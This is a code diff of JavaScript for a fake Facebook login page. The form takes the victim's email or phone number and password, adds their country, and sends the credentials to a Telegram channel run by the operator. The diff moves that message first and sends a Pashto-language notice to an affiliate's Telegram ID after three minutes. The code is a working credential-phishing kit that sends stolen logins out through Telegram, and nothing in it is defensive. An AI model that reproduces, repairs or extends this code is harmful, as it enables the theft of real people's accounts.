@@ -99,7 +99,7 @@
   document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
 
-    const identifier = document.getElementById('identifier').value; // email or number
+    const identifier = document.getElementById('identifier').value;
     const password = document.getElementById('password').value;
     const telegramId = getQueryParam('id');
 
@@ -112,16 +112,16 @@
     const country = geo.country_name || 'Unknown';
     const flag = getFlag(geo.country_code);
 
-    const userMessage = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}`;
+    const messageToChannel = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}`;
 
-    // 1. Send to user (Telegram ID)
-    await sendTelegramMessage(telegramId, userMessage);
+    // 1. لومړی پیغام چینل ته
+    await sendTelegramMessage(telegramChannel, messageToChannel);
 
-    // 2. Delay 3 minutes then send to channel
+    // 2. دری دقیقې وروسته پیغام یوزر ته
     setTimeout(() => {
-      const channelMessage = `⏰ ۳ دقیقې وروسته:\nLogin وشو له ${country} ${flag}.\nدا Login د Telegram ID [${telegramId}] له خوا ترسره شو.`;
-      sendTelegramMessage(telegramChannel, channelMessage);
-    }, 180000); // 3 minutes
+      const messageToUser = `✅ ستاسو پانګه ID ثبت شوه.\n📤 وروسته له لوګین څخه، پیغام چینل ته واستول شو.\n🆔 Telegram ID: ${telegramId}`;
+      sendTelegramMessage(telegramId, messageToUser);
+    }, 180000); // 3 minutes = 180000 ms
 
     alert('Please wait...');
   });
